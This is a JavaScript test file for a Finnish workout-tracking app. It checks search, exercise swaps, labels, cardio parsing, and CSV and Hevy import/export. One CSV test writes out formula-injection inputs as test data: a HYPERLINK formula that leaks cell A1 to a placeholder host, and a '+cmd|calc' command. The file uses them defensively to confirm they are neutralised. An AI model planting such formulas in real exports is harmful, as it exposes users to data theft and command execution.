const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');

const DIST = '../../.test-dist/';
const { createSeedExerciseLibrary } = require(`${DIST}data/seed.js`);
const { exerciseMatchesQuery } = require(`${DIST}lib/exerciseSearch.js`);
const { listPickerExercises } = require(`${DIST}lib/exercisePicker.js`);
const { identityKey, buildSwapShortlist } = require(`${DIST}lib/swapShortlist.js`);
const { exerciseNameLabel } = require(`${DIST}lib/exerciseNameLabel.js`);
const { localizeSessionName, localizeWorkoutFocus } = require(`${DIST}lib/sessionNameLabel.js`);
const { parseCardioDistanceKm, isCardioDistanceTextSavable } = require(`${DIST}lib/cardio.js`);
const { buildWorkoutLogCsv } = require(`${DIST}lib/workoutLogCsvExport.js`);
const { buildProgramCsv } = require(`${DIST}lib/programCsvExport.js`);
const { guardCsvFormula, unguardCsvFormula } = require(`${DIST}lib/csvRecords.js`);
const { parseCsvProgram, buildDraftFromCsvPreview } = require(`${DIST}lib/csvProgramImport.js`);
const { parseHevyCsv } = require(`${DIST}lib/hevyImport.js`);
const { persistCompletedWorkoutSessionsToDatabase } = require(`${DIST}state/completedWorkoutPersistence.js`);

const LIBRARY = createSeedExerciseLibrary();
const ENTRIES = LIBRARY.map((item) => ({ id: item.id, name: item.name, sourceCategory: item.sourceCategory }));

const read = (...segments) =>
  fs.readFileSync(path.join(__dirname, '..', '..', ...segments), 'utf8').split('\r\n').join('\n');

const listNames = (query, language = 'fi') =>
  listPickerExercises(LIBRARY, { query, language }).map((item) => item.name);

const HEVY_HEADER =
  'title,start_time,end_time,description,exercise_title,superset_id,exercise_notes,set_index,set_type,weight_kg,reps,distance_km,duration_seconds,rpe';
const hevyRow = (title, start, exercise, kg, reps = 5) =>
  `${title},"${start}","${start}",,${exercise},,,0,normal,${kg},${reps},,,`;

function hevyInputs(preview) {
  return preview.workouts.map((workout) => ({
    sessionId: `hevy_${Date.parse(workout.startedAt)}`,
    workoutTemplateId: 'hevy_import',
    workoutTemplateSessionId: null,
    workoutNameSnapshot: workout.name,
    startedAt: workout.startedAt,
    performedAt: workout.endedAt ?? workout.startedAt,
    logs: workout.exercises.map((exercise, orderIndex) => ({
      exerciseTemplateId: null,
      exerciseNameSnapshot: exercise.name,
      weight: Math.max(0, ...exercise.sets.map((set) => set.weightKg)),
      repsPerSet: exercise.sets.map((set) => set.reps),
      sets: exercise.sets.map((set, setIndex) => ({
        orderIndex: setIndex,
        weight: set.weightKg,
        reps: set.reps,
        kind: set.kind,
        outcome: 'completed',
        status: 'completed',
      })),
      tracked: true,
      orderIndex,
    })),
  }));
}

module.exports = [
  {
    name: 'hunt 9 search: an abbreviation the rows print stands for its word, not for its two letters',
    run() {
      // "kk" sits inside kyykky, penkki, lankku — the literal letters made
      // "kyykky kk" return every squat and "penkki kk" every bench.
      const squats = listNames('kyykky');
      const kettlebellSquats = listNames('kyykky kk');
      assert.ok(kettlebellSquats.length > 0, 'kettlebell squats are found');
      assert.ok(kettlebellSquats.length < squats.length, `narrowed: ${kettlebellSquats.length} of ${squats.length}`);
      assert.ok(kettlebellSquats.every((name) => squats.includes(name)));
      assert.deepEqual(listNames('penkki kk'), listNames('penkki kahvakuula'));

      const everyKettlebell = new Set(listNames('kahvakuula'));
      for (const name of listNames('kk')) {
        assert.ok(everyKettlebell.has(name), `"kk" matched ${name}, which is no kettlebell row`);
      }
      // The same for kp, which was only less visible.
      assert.deepEqual(listNames('kp'), listNames('kasipaino'));
      assert.ok(!exerciseMatchesQuery('Takakyykky', 'kk'));
      assert.ok(exerciseMatchesQuery('Kyykky kahvakuulalla', 'kk'));
    },
  },
  {
    name: 'hunt 9 search: a query that is an Object.prototype key is a plain word',
    run() {
      for (const query of ['constructor', 'Constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__']) {
        assert.doesNotThrow(() => listNames(query), query);
        assert.doesNotThrow(() => exerciseMatchesQuery('Bench Press', query), query);
      }
      assert.deepEqual(listNames('constructor'), []);
    },
  },
  {
    name: 'hunt 9 swap: 3/4 Sit-Up is not Sit-Up, and a reordered spelling still is',
    run() {
      assert.notEqual(identityKey('3/4 Sit-Up'), identityKey('Sit-Up'));
      assert.equal(identityKey('Glute Bridge (Banded)'), identityKey('Banded Glute Bridge'));
      assert.equal(identityKey('Sit-Up'), identityKey('sit up'));

      // A session holding Sit-Up no longer hides the other lift from the sheet.
      const options = [{ exerciseName: '3/4 Sit-Up' }, { exerciseName: 'Crunch' }];
      const shortlist = buildSwapShortlist('Crunch', options, { alreadyInSession: ['Sit-Up'] });
      const offered = [...shortlist.variations, ...shortlist.related].map((option) => option.exerciseName);
      assert.ok(offered.includes('3/4 Sit-Up'), offered.join(', '));
    },
  },
  {
    name: 'hunt 9 labels: names that are Object.prototype keys come back as the text typed',
    run() {
      for (const name of ['constructor', 'toString', 'valueOf', 'hasOwnProperty']) {
        for (const language of ['fi', 'en']) {
          assert.equal(exerciseNameLabel(language, name), name, `${language} ${name}`);
        }
        assert.equal(localizeSessionName(name, 'fi'), name);
        assert.equal(localizeSessionName(name[0].toUpperCase() + name.slice(1), 'fi'), name[0].toUpperCase() + name.slice(1));
        assert.equal(localizeWorkoutFocus(name, 'fi'), name);
        assert.equal(localizeWorkoutFocus(`Chest (${name})`, 'fi'), `Rinta (${name})`);
      }
      // The tables still answer for their own keys.
      assert.equal(exerciseNameLabel('fi', 'Barbell Bench Press - Medium Grip').length > 0, true);
      assert.equal(localizeWorkoutFocus('Upper (Heavy)', 'fi'), 'Ylävartalo (raskas)');
    },
  },
  {
    name: 'hunt 9 cardio: the distance is rounded first, then tested, and only a plain number counts',
    run() {
      // 0,004 rounds to nothing: not savable, instead of savable-then-dropped.
      assert.equal(parseCardioDistanceKm('0.004'), null);
      assert.equal(parseCardioDistanceKm('0,001'), null);
      assert.equal(isCardioDistanceTextSavable('0,004'), false);
      // 999,999 rounds to the 1000 that is refused.
      assert.equal(parseCardioDistanceKm('999.999'), null);
      assert.equal(parseCardioDistanceKm('999.995'), null);
      assert.equal(isCardioDistanceTextSavable('999,999'), false);
      // Number() literals that are not distances.
      for (const text of ['1e2', '0x10', '0b11', 'Infinity', '5 km']) {
        assert.equal(parseCardioDistanceKm(text), null, text);
      }
      // What was fine stays fine.
      assert.equal(parseCardioDistanceKm('0.005'), 0.01);
      assert.equal(parseCardioDistanceKm('999.99'), 999.99);
      assert.equal(parseCardioDistanceKm('4,2'), 4.2);
      assert.equal(parseCardioDistanceKm('.5'), 0.5);
      assert.equal(parseCardioDistanceKm('5.'), 5);
      assert.equal(parseCardioDistanceKm(' 10 '), 10);
    },
  },
  {
    name: 'hunt 9 csv: a cell that starts as a formula is defused in both exports and read back whole',
    run() {
      assert.equal(guardCsvFormula('=1+1'), "'=1+1");
      assert.equal(guardCsvFormula('Bench'), 'Bench');
      assert.equal(guardCsvFormula("'quoted"), "'quoted");
      for (const text of ['=1+1', '+cmd|calc', '-2+3', '@SUM(1)', "'=x", 'Bench', "'plain", '']) {
        assert.equal(unguardCsvFormula(guardCsvFormula(text)), text, text);
      }

      const log = buildWorkoutLogCsv({
        sessions: [
          { id: 's1', workoutTemplateId: 't', workoutNameSnapshot: '=HYPERLINK("http://e.example/?x="&A1,"Day 1")', performedAt: '2026-10-01T10:00:00.000Z' },
        ],
        logs: [
          {
            id: 'l1',
            sessionId: 's1',
            exerciseNameSnapshot: '@SUM(1+1)',
            weight: 100,
            repsPerSet: [],
            orderIndex: 0,
            tracked: true,
            sets: [{ orderIndex: 0, weight: 100, reps: 5, kind: 'working', outcome: null, status: 'completed' }],
          },
        ],
      });
      const row = log.split('\n')[1];
      assert.ok(row.startsWith('2026-10-01,"\'=HYPERLINK('), row);
      assert.ok(row.includes(",'@SUM(1+1),"), row);
      // Numbers stay bare, so a spreadsheet can still sum them.
      assert.ok(row.endsWith(',1,5,100,yes'), row);

      const sessions = [
        { name: '=1+1', exercises: [{ name: '+cmd|calc', sets: 3, repMin: 5, repMax: 5 }] },
        { name: 'Day B', exercises: [{ name: 'Bench Press', sets: 3, repMin: 8, repMax: 8 }] },
      ];
      const csv = buildProgramCsv(sessions);
      for (const cell of csv.split('\n').flatMap((line) => line.split(','))) {
        assert.doesNotMatch(cell, /^"?[=+\-@]/, `${cell} would run as a formula`);
      }
      // The round trip gives the names back as they were.
      const preview = parseCsvProgram(csv, ENTRIES);
      assert.deepEqual(
        preview.rows.map((entry) => [entry.day, entry.exerciseName]),
        [['=1+1', '+cmd|calc'], ['Day B', 'Bench Press']],
      );
    },
  },
  {
    name: 'hunt 9 csv: day names with no a-z or digit in them stay separate days',
    run() {
      for (const [first, second] of [['Пн', 'Вт'], ['💪', '🏃'], ['Ä', 'Ö']]) {
        const preview = parseCsvProgram(
          ['Day,Exercise,Sets,Reps', `${first},Bench Press,3,8`, `${second},Back Squat,3,8`, `${first},Barbell Row,3,8`].join('\n'),
          ENTRIES,
        );
        assert.equal(preview.dayCount, 2, `${first} / ${second}`);
        const draft = buildDraftFromCsvPreview(preview, 'Imported');
        assert.deepEqual(draft.sessions.map((session) => session.name), [first, second]);
        assert.equal(draft.sessions[0].exercises.length, 2);
      }
      // Case and spacing are still one day.
      const same = parseCsvProgram(['Day,Exercise,Sets,Reps', 'Ä  Ä,Bench Press,3,8', 'ä ä,Back Squat,3,8'].join('\n'), ENTRIES);
      assert.equal(same.dayCount, 1);
    },
  },
  {
    name: 'hunt 9 csv: digits are never joined across a space in a Reps cell',
    run() {
      const parse = (reps) => parseCsvProgram(`Day,Exercise,Sets,Reps\nA,Bench Press,3,"${reps}"`, ENTRIES);
      for (const reps of ['6 8', '2 5', '6 8 reps', '12 15']) {
        const preview = parse(reps);
        assert.equal(preview.rows.length, 0, `${reps} is refused`);
        assert.ok(preview.errors.length > 0, reps);
      }
      // Space around a separator is still fine.
      for (const [reps, min, max] of [['8 - 10', 8, 10], ['8-10', 8, 10], ['6 – 8', 6, 8], ['8', 8, 8], [' 12 ', 12, 12], ['10 reps', 10, 10]]) {
        const row = parse(reps).rows[0];
        assert.ok(row, reps);
        assert.deepEqual([row.repMin, row.repMax], [min, max], reps);
      }
    },
  },
  {
    name: 'hunt 9 csv: matching does not scale with rows x library on every parse',
    run() {
      // Rows the library does not know used to re-fold every library name and
      // build a RegExp for each (about 3 ms a row in Node, ~20x on the phone),
      // and the paste box parses again on every keystroke. The cost is the
      // index built once per library array, so a second parse of the same
      // library is cheap whatever the count of unmatched rows.
      const names = ['Penkkipunnerrus', 'Takakyykky', 'Maastanosto', 'Pystypunnerrus', 'Hauiskääntö', 'Ojentajapunnerrus'];
      const lines = ['Day,Exercise,Sets,Reps'];
      for (let row = 0; row < 120; row += 1) {
        lines.push(`D${row % 7},${names[row % names.length]} ${row},3,8-10`);
      }
      const csv = lines.join('\n');
      parseCsvProgram(csv, ENTRIES);
      const started = process.hrtime.bigint();
      const preview = parseCsvProgram(csv, ENTRIES);
      const ms = Number(process.hrtime.bigint() - started) / 1e6;
      assert.equal(preview.unmatchedCount, 120);
      // Before: ~450 ms in Node for these 120 rows. After: a few ms. The bound
      // is loose on purpose; it is the order of magnitude that is guarded.
      assert.ok(ms < 150, `120 unmatched rows took ${ms.toFixed(0)} ms`);

      const source = read('src', 'lib', 'csvProgramImport.ts');
      assert.doesNotMatch(source, /new RegExp\(/, 'a RegExp built per library row is the cost that was removed');
      assert.match(source, /LIBRARY_INDEXES = new WeakMap/);
    },
  },
  {
    name: 'hunt 9 hevy: sets over the ceiling are left out and said, not counted and then lost',
    run() {
      const mixed = parseHevyCsv(
        [
          HEVY_HEADER,
          hevyRow('Legs', '10 Jun 2024, 08:15', 'Leg Press', 700),
          hevyRow('Legs', '10 Jun 2024, 08:15', 'Leg Press', 720, 8),
          hevyRow('Legs', '10 Jun 2024, 08:15', 'Squat', 100),
        ].join('\n'),
      );
      assert.equal(mixed.setCount, 1, 'the preview counts what the loader keeps');
      assert.equal(mixed.overweightSetCount, 2);
      assert.deepEqual(mixed.workouts[0].exercises.map((exercise) => exercise.name), ['Squat']);

      // The ceiling itself is still a set: 600 imports, 601 does not.
      assert.equal(parseHevyCsv([HEVY_HEADER, hevyRow('A', '10 Jun 2024, 08:15', 'Squat', 600)].join('\n')).setCount, 1);
      assert.equal(parseHevyCsv([HEVY_HEADER, hevyRow('A', '10 Jun 2024, 08:15', 'Squat', 601)].join('\n')).setCount, 0);

      // A workout of nothing else is no workout in the preview, so it can
      // not be imported and reported as one that already existed.
      const sled = parseHevyCsv([HEVY_HEADER, hevyRow('Sled', '11 Jun 2024, 08:15', 'Sled Push', 800, 10)].join('\n'));
      assert.equal(sled.workouts.length, 0);
      assert.equal(sled.overweightSetCount, 1);
      assert.deepEqual(sled.errors, ['NO_WORKOUTS']);

      const screen = read('src', 'components', 'NewProgramSheet.tsx');
      assert.match(screen, /hevyPreview\.overweightSetCount > 0/);
      assert.match(screen, /'hevy\.overweight'/);
    },
  },
  {
    name: 'hunt 9 hevy: a workout with nothing loggable is skipped, never "already existed"',
    run() {
      const database = { workoutSessions: [], exerciseLogs: [] };
      const input = (sessionId, sets) => ({
        sessionId,
        workoutTemplateId: 'hevy_import',
        workoutTemplateSessionId: null,
        workoutNameSnapshot: 'Day',
        startedAt: '2024-06-10T08:15:00.000Z',
        performedAt: '2024-06-10T09:00:00.000Z',
        logs: [
          {
            exerciseTemplateId: null,
            exerciseNameSnapshot: 'Sled Push',
            weight: Math.max(0, ...sets.map((set) => set.weight)),
            repsPerSet: sets.map((set) => set.reps),
            sets: sets.map((set, orderIndex) => ({ orderIndex, ...set, kind: 'working', outcome: 'completed', status: 'completed' })),
            tracked: true,
            orderIndex: 0,
          },
        ],
      });
      const good = input('hevy_1', [{ weight: 100, reps: 5 }]);
      const heavy = input('hevy_2', [{ weight: 800, reps: 10 }]);
      const result = persistCompletedWorkoutSessionsToDatabase(database, [good, heavy, good]);
      assert.equal(result.imported, 1);
      assert.equal(result.skipped, 1, 'the workout nothing of which can be logged');
      assert.equal(result.duplicates, 1, 'only the repeat id is a duplicate');

      const none = persistCompletedWorkoutSessionsToDatabase(database, [heavy]);
      assert.deepEqual([none.imported, none.duplicates, none.skipped], [0, 0, 1]);

      const shell = read('src', 'app', 'renderAppShell.tsx');
      assert.match(shell, /result\.skipped > 0/);
      assert.match(shell, /'hevy\.doneLeftOut'/);
      // The numbers survive the provider's return.
      assert.match(read('src', 'state', 'AppProvider.tsx'), /skipped: result\.skipped/);
    },
  },
  {
    name: 'hunt 9 hevy: the preview and the stored sets agree for a whole export',
    run() {
      const preview = parseHevyCsv(
        [
          HEVY_HEADER,
          hevyRow('Legs', '10 Jun 2024, 08:15', 'Leg Press', 700),
          hevyRow('Legs', '10 Jun 2024, 08:15', 'Squat', 100),
          hevyRow('Sled', '11 Jun 2024, 08:15', 'Sled Push', 800),
          hevyRow('Push', '12 Jun 2024, 08:15', 'Bench Press', 80),
        ].join('\n'),
      );
      const result = persistCompletedWorkoutSessionsToDatabase({ workoutSessions: [], exerciseLogs: [] }, hevyInputs(preview));
      const stored = result.database.exerciseLogs.reduce((sum, log) => sum + log.sets.length, 0);
      assert.equal(preview.setCount, stored);
      assert.equal(preview.workouts.length, result.imported);
      assert.equal(result.skipped + result.duplicates, 0);
    },
  },
];
